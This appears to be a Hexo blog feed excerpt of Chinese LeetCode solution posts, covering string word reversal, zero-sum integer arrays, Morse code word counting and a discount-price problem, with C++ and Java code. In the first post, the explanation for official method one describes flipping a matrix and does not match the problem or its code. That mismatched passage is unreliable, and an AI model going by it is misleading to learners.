    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个字符串，你需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;Let&#39;s take LeetCode contest&quot;</span><br><span class="line">输出：&quot;s&#39;teL ekat edoCteeL tsetnoc&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>在字符串中，每个单词由单个空格分隔，并且字符串中不会有任何额外的空格。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串，根据空格获取每一个单词，然后对单词进行反转结果存到result字符串中，注意最后一个单词的处理。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败95.81%，内存消耗13.5M，击败16.30%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> word=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27; &#x27;</span> || i==n<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="comment">//单词的长度</span></span><br><span class="line">                len=word.length();</span><br><span class="line">                <span class="comment">//反转每个单词的字符顺序</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len/<span class="number">2</span>;++j)&#123;</span><br><span class="line">                    swap(word[j],word[len-j<span class="number">-1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将反转后的单词和空格存到结果中</span></span><br><span class="line">                <span class="comment">//不是最后一个单词，后面才加空格,最后一个单词的最后一个字母没有拼接到注意处理</span></span><br><span class="line">                result+=(i==n<span class="number">-1</span>)?(s[i]+word):(word+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                <span class="comment">//清空单词变量进行下个单词的反转</span></span><br><span class="line">                word=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//拼接单词</span></span><br><span class="line">                word+=s[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/solution/fan-zhuan-zi-fu-chuan-zhong-de-dan-ci-iii-by-lee-2/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>我们可以不使用额外的（非常数）空间来完成翻转和反转操作。对于 <code>A[i][j]​</code>，我们将它和 <code>A[i][c - j - 1]​</code> 进行交换（即翻转），其中 <code>c</code> 是数组 <code>A</code> 的列数。在交换的同时，我们可以将这两个数进行反转。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败99.05%，内存消耗10.9M，击败31.29%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ret;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> p = start; p &lt; i; p++) &#123;</span><br><span class="line">                ret.push_back(s[start + i - <span class="number">1</span> - p]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                ret.push_back(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 为字符串的长度。原字符串中的每个字符都会在 $O(1)$的时间内放入新字符串中。</p>
</li>
<li><p>空间复杂度：$O(N)$。我们开辟了与原字符串等大的空间。</p>
</li>
</ul>
<p><strong>方法二：原地解法</strong></p>
<p><strong>思路与算法</strong></p>
<p>此题也可以直接在原字符串上进行操作，避免额外的空间开销。当找到一个单词的时候，我们交换字符串第一个字符与倒数第一个字符，随后交换第二个字符与倒数第二个字符…… 如此反复，就可以在原空间上翻转单词。</p>
<p>需要注意的是，原地算法在某些语言（比如 Java，JavaScript）中不适用，因为在这些语言中 String 类型是一个不可变的类型。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败99.05%，内存消耗9.6M，击败57.14%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> left = start, right = i - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">                swap(s[left], s[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$。字符串中的每个字符要么在 $O(1)$ 的时间内被交换到相应的位置，要么因为是空格而保持不动。</p>
</li>
<li><p>空间复杂度：$O(1)$。因为不需要开辟额外的数组。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>题目比较灵活，代码有多种写法，我写的还是有点麻烦，其实可以利用好每个单词的起止位置，也挺好做的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>和为零的N个唯一整数</title>
    <url>/2020/11/14/%E5%92%8C%E4%B8%BA%E9%9B%B6%E7%9A%84N%E4%B8%AA%E5%94%AF%E4%B8%80%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/find-n-unique-integers-sum-up-to-zero/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数 <code>n</code>，请你返回 <strong>任意</strong> 一个由 <code>n</code> 个 <strong>各不相同</strong> 的整数组成的数组，并且这 <code>n</code> 个数相加和为 <code>0</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 5</span><br><span class="line">输出：[-7,-1,1,3,4]</span><br><span class="line">解释：这些数组也是正确的 [-5,-1,1,2,3]，[-3,-1,2,-2,4]。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 3</span><br><span class="line">输出：[-1,0,1]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1</span><br><span class="line">输出：[0]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>多种做法</p>
<p>方法一：可以把前面几个数加起来，最后一个数取之前所有元素和的相反数，</p>
<p>方法二：同时放入每个数和它的相反数，注意奇数时要放入0</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败43.73%，内存消耗7M，击败14.56%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sumZero</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="comment">//n为奇数,数组中放入0</span></span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">            result.push_back(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//放入整数和它的相反数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n/<span class="number">2</span>+<span class="number">1</span>;++i)&#123;</span><br><span class="line">            result.push_back(i);</span><br><span class="line">            result.push_back(i*<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-n-unique-integers-sum-up-to-zero/solution/">官方题解</a>:</h6><p><strong>方法一：构造</strong><br>我们首先将最小的 <code>n - 1</code> 个自然数 <code>0, 1, 2, ..., n - 2</code> 放入数组中，它们的和为 <code>sum</code>。对于剩下的 <code>1</code> 个数，我们可以令其为 <code>-sum</code>，此时这 <code>n</code> 个数的和为 <code>0</code>，并且：</p>
<p>当 <code>n = 1</code> 时，我们构造的答案中只有唯一的 <code>1</code> 个数 <code>0</code>；</p>
<p>当 <code>n &gt; 1</code> 时，我们构造的答案中包含 <code>n - 1</code> 个互不相同的自然数和 <code>1</code> 个负数；</p>
<p>因此这 <code>n</code> 个数互不相同，即我们得到了一个满足要求的数组。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败43.73%，内存消耗6.9M，击败20.06%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sumZero</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            ans.push_back(i);</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        ans.push_back(-sum);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$。</li>
<li>空间复杂度：$O(1)$，除了存储答案的数组 <code>ans</code> 之外，额外的空间复杂度是 $O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解就是我思路里的第一种解法，哈哈哈😁，我使用的是第二种。还有就是c++可以直接在整数前加’-‘取相反数。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>唯一摩尔斯密码词</title>
    <url>/2020/11/13/%E5%94%AF%E4%B8%80%E6%91%A9%E5%B0%94%E6%96%AF%E5%AF%86%E7%A0%81%E8%AF%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/unique-morse-code-words/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>国际摩尔斯密码定义一种标准编码方式，将每个字母对应于一个由一系列点和短线组成的字符串， 比如: <code>&quot;a&quot;</code> 对应 <code>&quot;.-&quot;</code>, “b” 对应 <code>&quot;-...&quot;</code>, <code>&quot;c&quot;</code> 对应 <code>&quot;-.-.&quot;</code>, 等等。</p>
<a id="more"></a>
<p>为了方便，所有26个英文字母对应摩尔斯密码表如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;]</span><br></pre></td></tr></table></figure>
<p>给定一个单词列表，每个单词可以写成每个字母对应摩尔斯密码的组合。例如，”cab” 可以写成 “-.-..—…”，(即 “-.-.” + “.-“ + “-…” 字符串的结合)。我们将这样一个连接过程称作单词翻译。</p>
<p>返回我们可以获得所有词不同单词翻译的数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如:</span><br><span class="line">输入: words &#x3D; [&quot;gin&quot;, &quot;zen&quot;, &quot;gig&quot;, &quot;msg&quot;]</span><br><span class="line">输出: 2</span><br><span class="line">解释: </span><br><span class="line">各单词翻译如下:</span><br><span class="line">&quot;gin&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;zen&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;gig&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line">&quot;msg&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line"></span><br><span class="line">共有 2 种不同翻译, &quot;--...-.&quot; 和 &quot;--...--.&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>注意:</strong></p>
<ul>
<li>单词列表<code>words</code> 的长度不会超过 <code>100</code>。</li>
<li>每个单词 <code>words[i]</code>的长度范围为 <code>[1, 12]</code>。</li>
<li>每个单词 <code>words[i]</code>只包含小写字母。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>建立摩尔斯密码和字母之间的映射，遍历words数组，对每一个单词求出对应的翻译，然后作为键存到map容器中，单词作为它的值。这样不同单词有相同翻译的时候，只会在map中存储一次，相同的键后面会覆盖前面的值。最后答案就是map容器元素的个数。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败65.97%，内存消耗8.9M，击败15.82%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniqueMorseRepresentations</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s[<span class="number">26</span>]=&#123;<span class="string">&quot;.-&quot;</span>,<span class="string">&quot;-...&quot;</span>,<span class="string">&quot;-.-.&quot;</span>,<span class="string">&quot;-..&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;..-.&quot;</span>,<span class="string">&quot;--.&quot;</span>,<span class="string">&quot;....&quot;</span>,<span class="string">&quot;..&quot;</span>,<span class="string">&quot;.---&quot;</span>,<span class="string">&quot;-.-&quot;</span>,<span class="string">&quot;.-..&quot;</span>,<span class="string">&quot;--&quot;</span>,<span class="string">&quot;-.&quot;</span>,<span class="string">&quot;---&quot;</span>,<span class="string">&quot;.--.&quot;</span>,<span class="string">&quot;--.-&quot;</span>,<span class="string">&quot;.-.&quot;</span>,<span class="string">&quot;...&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;..-&quot;</span>,<span class="string">&quot;...-&quot;</span>,<span class="string">&quot;.--&quot;</span>,<span class="string">&quot;-..-&quot;</span>,<span class="string">&quot;-.--&quot;</span>,<span class="string">&quot;--..&quot;</span>&#125;;</span><br><span class="line">        <span class="built_in">string</span> alp=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt; m;</span><br><span class="line">        <span class="comment">//遍历单词列表</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;words.size();++i)&#123;</span><br><span class="line">            <span class="built_in">string</span> tmp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">//转换单词中的每个字母为摩尔斯密码</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">char</span> c:words[i])&#123;</span><br><span class="line">                tmp+=s[alp.find(c)];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//使用map容器存储，摩尔斯密码作为键，单词作为值，利用map中元素关键字不能重复的特性进行去重</span></span><br><span class="line">            m[tmp]=words[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/unique-morse-code-words/solution/wei-yi-mo-er-si-mi-ma-ci-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：哈希集合</strong></p>
<p>我们将数组 <code>word</code> 中的每个单词转换为摩尔斯码，并加入哈希集合（HashSet）中，最终的答案即为哈希集合中元素的个数。</p>
<p><strong>Java代码：</strong>(执行用时2ms，击败99.10%，内存消耗36.4M，击败82.85%）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniqueMorseRepresentations</span><span class="params">(String[] words)</span> </span>&#123;</span><br><span class="line">        String[] MORSE = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;.-&quot;</span>,<span class="string">&quot;-...&quot;</span>,<span class="string">&quot;-.-.&quot;</span>,<span class="string">&quot;-..&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;..-.&quot;</span>,<span class="string">&quot;--.&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;....&quot;</span>,<span class="string">&quot;..&quot;</span>,<span class="string">&quot;.---&quot;</span>,<span class="string">&quot;-.-&quot;</span>,<span class="string">&quot;.-..&quot;</span>,<span class="string">&quot;--&quot;</span>,<span class="string">&quot;-.&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;---&quot;</span>,<span class="string">&quot;.--.&quot;</span>,<span class="string">&quot;--.-&quot;</span>,<span class="string">&quot;.-.&quot;</span>,<span class="string">&quot;...&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;..-&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;...-&quot;</span>,<span class="string">&quot;.--&quot;</span>,<span class="string">&quot;-..-&quot;</span>,<span class="string">&quot;-.--&quot;</span>,<span class="string">&quot;--..&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Set&lt;String&gt; seen = <span class="keyword">new</span> HashSet();</span><br><span class="line">        <span class="keyword">for</span> (String word: words) &#123;</span><br><span class="line">            StringBuilder code = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> c: word.toCharArray())</span><br><span class="line">                code.append(MORSE[c - <span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">            seen.add(code.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> seen.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(S)，其中 $S$ 是数组 <code>words</code> 中所有单词的长度之和。</li>
<li>空间复杂度：O(S)。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，英雄所见略同😊，不过官方题解没给出c++实现只有Java和Python。另外在查找每个字母对应的摩尔斯码的时候，索引可以用字母和‘a’的差值来计算，不用像我那样去查找该字母在字母表中的位置。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>商品折扣后的最终价格</title>
    <url>/2020/11/21/%E5%95%86%E5%93%81%E6%8A%98%E6%89%A3%E5%90%8E%E7%9A%84%E6%9C%80%E7%BB%88%E4%BB%B7%E6%A0%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/final-prices-with-a-special-discount-in-a-shop/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>prices</code> ，其中 <code>prices[i]</code> 是商店里第 i 件商品的价格。</p>
<p>商店里正在进行促销活动，如果你要买第 i 件商品，那么你可以得到与 <code>prices[j]</code> 相等的折扣，其中 <code>j</code> 是满足 <code>j &gt; i</code> 且 <code>prices[j] &lt;= prices[i]</code> 的 最小下标 ，如果没有满足条件的 <code>j</code> ，你将没有任何折扣。</p>
<p>请你返回一个数组，数组中第 <code>i</code> 个元素是折扣后你购买商品 <code>i</code> 最终需要支付的价格。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：prices &#x3D; [8,4,6,2,3]</span><br><span class="line">输出：[4,2,4,2,3]</span><br><span class="line">解释：</span><br><span class="line">商品 0 的价格为 price[0]&#x3D;8 ，你将得到 prices[1]&#x3D;4 的折扣，所以最终价格为 8 - 4 &#x3D; 4 。</span><br><span class="line">商品 1 的价格为 price[1]&#x3D;4 ，你将得到 prices[3]&#x3D;2 的折扣，所以最终价格为 4 - 2 &#x3D; 2 。</span><br><span class="line">商品 2 的价格为 price[2]&#x3D;6 ，你将得到 prices[3]&#x3D;2 的折扣，所以最终价格为 6 - 2 &#x3D; 4 。</span><br><span class="line">商品 3 和 4 都没有折扣。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：prices &#x3D; [1,2,3,4,5]</span><br><span class="line">输出：[1,2,3,4,5]</span><br><span class="line">解释：在这个例子中，所有商品都没有折扣。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：prices &#x3D; [10,1,1,6]</span><br><span class="line">输出：[9,0,1,6]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= prices.length &lt;= 500</code></li>
<li><code>1 &lt;= prices[i] &lt;= 10^3</code></li>
</ul>
